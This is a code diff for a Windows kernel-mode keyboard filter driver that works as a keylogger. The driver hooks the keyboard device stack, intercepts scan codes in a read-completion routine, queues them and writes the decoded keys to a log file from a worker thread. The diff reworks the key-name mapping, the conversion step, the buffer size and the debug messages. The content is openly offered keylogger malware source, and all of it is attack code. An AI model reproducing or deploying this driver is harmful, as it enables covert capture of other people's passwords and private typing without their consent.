@@ -9,7 +9,6 @@
 #include <ntddk.h>
 #include <ntstrsafe.h>
 #include "source.h"
-#include "scancode.h"
 
 //UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\kbdDevice");                    // ADDED
 //UNICODE_STRING SymLinkName = RTL_CONSTANT_STRING(L"\\??\\kbdDeviceLink");                   // ADDED
@@ -35,8 +34,8 @@ VOID GetKey(char* buf, USHORT makecode)
     case 0x0B: strcpy(buf, "0"); break;
     case 0x0C: strcpy(buf, "-"); break;
     case 0x0D: strcpy(buf, "="); break;
-    case 0x0E: strcpy(buf, "BKS"); break;
-    case 0x0F: strcpy(buf, "TAB"); break;
+    case 0x0E: strcpy(buf, "[BKS]"); break;
+    case 0x0F: strcpy(buf, "[TAB]"); break;
     case 0x10: strcpy(buf, "q"); break;
     case 0x11: strcpy(buf, "w"); break;
     case 0x12: strcpy(buf, "e"); break;
@@ -49,8 +48,8 @@ VOID GetKey(char* buf, USHORT makecode)
     case 0x19: strcpy(buf, "p"); break;
     case 0x1A: strcpy(buf, "["); break;
     case 0x1B: strcpy(buf, "]"); break;
-    case 0x1C: strcpy(buf, "ENT"); break;
-    case 0x1D: strcpy(buf, "RCTRL"); break;
+    case 0x1C: strcpy(buf, "[ENT]"); break;
+    case 0x1D: strcpy(buf, "[RCTRL]"); break;
     case 0x1E: strcpy(buf, "a"); break;
     case 0x1F: strcpy(buf, "s"); break;    
     case 0x20: strcpy(buf, "d"); break;
@@ -63,7 +62,7 @@ VOID GetKey(char* buf, USHORT makecode)
     case 0x27: strcpy(buf, ";"); break;
     case 0x28: strcpy(buf, "'"); break;
     case 0x29: strcpy(buf, "UNK"); break;
-    case 0x2A: strcpy(buf, "LSHFT"); break;
+    case 0x2A: strcpy(buf, "[LSHFT]"); break;
     case 0x2B: strcpy(buf, "\\"); break;
     case 0x2C: strcpy(buf, "z"); break;
     case 0x2D: strcpy(buf, "x"); break;
@@ -75,14 +74,14 @@ VOID GetKey(char* buf, USHORT makecode)
     case 0x33: strcpy(buf, ","); break;
     case 0x34: strcpy(buf, "."); break;
     case 0x35: strcpy(buf, "/"); break;
-    case 0x36: strcpy(buf, "RSHFT"); break;
+    case 0x36: strcpy(buf, "[RSHFT]"); break;
     case 0x37: strcpy(buf, "NYI"); break;
-    case 0x38: strcpy(buf, "RALT"); break;
-    case 0x39: strcpy(buf, "SPACE"); break;
+    case 0x38: strcpy(buf, "[RALT]"); break;
+    case 0x39: strcpy(buf, " "); break;
     case 0x3A: strcpy(buf, "NYI"); break;
     case 0x3B: strcpy(buf, "NYI"); break;
     case 0x3C: strcpy(buf, "NYI"); break;
-    case 0x3D: strcpy(buf, "RCTRL"); break;
+    case 0x3D: strcpy(buf, "[RCTRL]"); break;
 
     default: strcpy(buf, "NYI");  break;
     }
@@ -90,12 +89,11 @@ VOID GetKey(char* buf, USHORT makecode)
 
 VOID Unload(IN PDRIVER_OBJECT pDriverObject)
 {    
-    PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
-    DbgPrint("[*] Driver Unload Called\n");
+    PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;    
 
     // Detach Device
     IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);
-    DbgPrint("[*] Keyboard hook detached from Device\n");
+    DbgPrint("[*] Keyboard Hook Detached from Device\n");
 
     // Initialize timer
     KTIMER kTimer;
@@ -117,16 +115,16 @@ VOID Unload(IN PDRIVER_OBJECT pDriverObject)
     KeReleaseSemaphore(&pKeyboardDeviceExtension->semQueue, 0, 1, TRUE);
 
     // Wait until the worker thread terminates.
-    DbgPrint("Waiting for key logger thread to terminate...\n");
+    //DbgPrint("Waiting for key logger thread to terminate...\n");
     KeWaitForSingleObject(pKeyboardDeviceExtension->pThreadObj, Executive, KernelMode, FALSE, NULL);
-    DbgPrint("Key logger thread terminated\n");
+    DbgPrint("[*] Key Logger Thread Finished\n");
 
     // Close the log file
     ZwClose(pKeyboardDeviceExtension->hLogFile);
 
     // Delete the device.
     IoDeleteDevice(pDriverObject->DeviceObject);
-    DbgPrint("Tagged IRPs dead...Terminating...\n");
+    DbgPrint("[*] IoDeleteDevice Successful\n");
     return;
 }
 
@@ -172,16 +170,16 @@ NTSTATUS OnReadCompletion(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context
 
         for (int i = 0; i < numKeys; i++)
         {
-            DbgPrint("ScanCode: %x\n", keys[i].MakeCode);
+            //DbgPrint("ScanCode: 0x%x\n", keys[i].MakeCode);
 
             if (keys[i].Flags == KEY_MAKE)
             {
-                DbgPrint("%s\n", "Key Down");
+                //DbgPrint("%s\n", "Key Down");
 
                 /* MY HAND CRAFTED DEBUG VIEWER KEY LOGGER */
                 char buf[64];
                 GetKey(buf, keys[i].MakeCode);
-                DbgPrint("Key: %s (0x%x)\n", buf, keys[i].MakeCode);
+                //DbgPrint("[*] Key: %s (0x%x)\n", buf, keys[i].MakeCode);
                 RtlZeroMemory(buf, 64);
                 /*******************************************/
 
@@ -189,11 +187,11 @@ NTSTATUS OnReadCompletion(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context
                 KEY_DATA* kData = (KEY_DATA*)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA));
 
                 // Fill in kData structure with info from IRP.
-                kData->KeyData = (char)keys[i].MakeCode;
+                kData->KeyData = keys[i].MakeCode;
                 kData->KeyFlags = (char)keys[i].Flags;
 
                 // Add the scan code to the linked list queue so our worker thread can write it out to a file.
-                DbgPrint("Adding IRP to work queue...\n"); 
+                //DbgPrint("Adding IRP to work queue...\n"); 
 
                 ExInterlockedInsertTailList(&pKeyboardDeviceExtension->QueueListHead, &kData->ListEntry, &pKeyboardDeviceExtension->lockQueue);
 
@@ -270,13 +268,12 @@ NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject)
 
 VOID ThreadKeyLogger(IN PVOID pContext)
 {
-    DbgPrint("Enter ThreadKeyLogger\n");
+    //DbgPrint("Enter ThreadKeyLogger\n");
 
     PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pContext;
-    //PDEVICE_OBJECT pKeyboardDeviceObject = pKeyboardDeviceExtension->pKeyboardDevice;
     PLIST_ENTRY pListEntry;
     KEY_DATA* kData;
-    char keys[3] = { 0 };
+    char keys[64] = { 0 };
 
     while (TRUE)
     {
@@ -292,7 +289,7 @@ VOID ThreadKeyLogger(IN PVOID pContext)
 
         kData = CONTAINING_RECORD(pListEntry, KEY_DATA, ListEntry);
 
-        ConvertScanCodeToKeyCode(pKeyboardDeviceExtension, kData, keys);
+        GetKey(keys, kData->KeyData);
 
         if (keys != 0)
         {
@@ -303,18 +300,16 @@ VOID ThreadKeyLogger(IN PVOID pContext)
                 
                 if (status != STATUS_SUCCESS)
                 {
-                    DbgPrint("Writing scan code to file...\n");
+                    DbgPrint("[!] ZwWriteFile Failed\n");
                 }
 
                 else
                 {
-                    DbgPrint("Scan code '%s' successfully written to file...\n", keys);
+                    DbgPrint("[*] Key '%s' successfully written to file\n", keys);
                 }
             }
         }
     }
-
-    DbgPrint("Enter ThreadKeyLogger\n");
 
     return;
 }
@@ -419,8 +414,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING Registr
     }
     else
     {
-        DbgPrint("[*] Successfully created log file...\n");
-        DbgPrint("File Handle = %x\n", pKeyboardDeviceExtension->hLogFile);
+        DbgPrint("[*] Log File Created with Handle: %x\n", pKeyboardDeviceExtension->hLogFile);
     }
 
     pDriverObject->DriverUnload = Unload;
